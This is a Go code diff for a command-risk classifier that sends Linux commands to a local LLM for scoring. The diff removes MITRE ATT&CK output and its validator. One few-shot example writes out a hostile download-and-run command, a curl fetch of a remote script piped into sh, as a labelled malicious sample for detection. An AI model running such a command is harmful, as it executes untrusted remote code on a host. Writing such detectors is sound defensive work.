@@ -8,7 +8,6 @@ import (
 	"fmt"
 	"io"
 	"net/http"
-	"regexp"
 	"strings"
 	"time"
 )
@@ -29,8 +28,7 @@ const systemPrompt = `You are a Linux endpoint security analyst. You are given a
 Reply with ONLY a single JSON object, no prose, with exactly these keys:
 {"risk_score": <float 0..1, probability the command is malicious>,
  "verdict": "benign"|"suspicious"|"malicious",
- "reason": "<short human explanation>",
- "mitre": ["<MITRE ATT&CK technique IDs, e.g. T1059>"],
+ "reason": "<one short sentence, 12 words max>",
  "risk_indicators": ["<short tokens, e.g. curl|sh>"]}
 
 Linux tradecraft that raises risk:
@@ -53,37 +51,22 @@ var fewShot = []struct {
 }{
 	{
 		Command: "apt-get update",
-		JSON:    `{"risk_score":0.03,"verdict":"benign","reason":"routine package index refresh","mitre":[],"risk_indicators":[]}`,
+		JSON:    `{"risk_score":0.03,"verdict":"benign","reason":"routine package index refresh","risk_indicators":[]}`,
 	},
 	{
 		Command: "bash -c curl -fsSL http://10.0.0.9/s.sh | sh",
-		JSON:    `{"risk_score":0.95,"verdict":"malicious","reason":"remote script downloaded and piped straight into a shell","mitre":["T1059","T1105"],"risk_indicators":["curl|sh"]}`,
+		JSON:    `{"risk_score":0.95,"verdict":"malicious","reason":"remote script piped into a shell","risk_indicators":["curl|sh"]}`,
 	},
 	{
 		// Benign twin: a desktop/JS process that superficially looks scriptish
 		// but is a normal GNOME extension — must score LOW (curbs false positives).
 		Command: "gjs /usr/share/gnome-shell/extensions/ding@rastersoft.com/app/ding.js",
-		JSON:    `{"risk_score":0.02,"verdict":"benign","reason":"GNOME desktop shell extension","mitre":[],"risk_indicators":[]}`,
+		JSON:    `{"risk_score":0.02,"verdict":"benign","reason":"GNOME desktop shell extension","risk_indicators":[]}`,
 	},
 }
 
-// mitreRe matches valid MITRE ATT&CK technique IDs (e.g. T1059, T1059.004).
-var mitreRe = regexp.MustCompile(`^T\d{4}(\.\d{3})?$`)
-
 // validVerdicts is the allowed verdict label set.
 var validVerdicts = map[string]bool{"benign": true, "suspicious": true, "malicious": true}
-
-// keepValidMitre drops hallucinated/malformed technique IDs (e.g. "T102",
-// "R1202") so only well-formed ATT&CK codes reach the output.
-func keepValidMitre(in []string) []string {
-	out := []string{}
-	for _, m := range in {
-		if m = strings.TrimSpace(m); mitreRe.MatchString(m) {
-			out = append(out, m)
-		}
-	}
-	return out
-}
 
 // OllamaClient scores commands via a local Ollama server running a small model.
 type OllamaClient struct {
@@ -125,8 +108,9 @@ func (c *OllamaClient) Score(ctx context.Context, e ExecEvent) (ScoreResult, err
 		Prompt: buildPrompt(e),
 		Stream: false,
 		Format: "json", // force the model to emit a valid JSON object
-		// temperature 0 for repeatable verdicts; num_predict caps runaway output.
-		Options: map[string]any{"temperature": 0, "num_predict": 256},
+		// temperature 0 for repeatable verdicts; num_predict caps output (small —
+		// we ask for only score+verdict+short reason+indicators, no mitre).
+		Options: map[string]any{"temperature": 0, "num_predict": 96},
 	})
 	if err != nil {
 		return ScoreResult{}, err
@@ -184,12 +168,13 @@ func buildPrompt(e ExecEvent) string {
 }
 
 // rawResult is the model's expected JSON shape. risk_score is a pointer so we
-// can tell "absent" from "0".
+// can tell "absent" from "0". mitre is no longer requested (dropped to cut
+// output tokens and because a 1B model hallucinated codes); Verdict.Mitre is
+// always emitted empty.
 type rawResult struct {
 	RiskScore      *float64 `json:"risk_score"`
 	Verdict        string   `json:"verdict"`
 	Reason         string   `json:"reason"`
-	Mitre          []string `json:"mitre"`
 	RiskIndicators []string `json:"risk_indicators"`
 }
 
@@ -229,7 +214,7 @@ func parseResult(text string) (ScoreResult, error) {
 		RiskScore:      score,
 		Verdict:        verdict,
 		Reason:         strings.TrimSpace(raw.Reason),
-		Mitre:          keepValidMitre(raw.Mitre), // drop hallucinated codes
+		Mitre:          []string{}, // no longer requested from the model
 		RiskIndicators: raw.RiskIndicators,
 	}, nil
 }
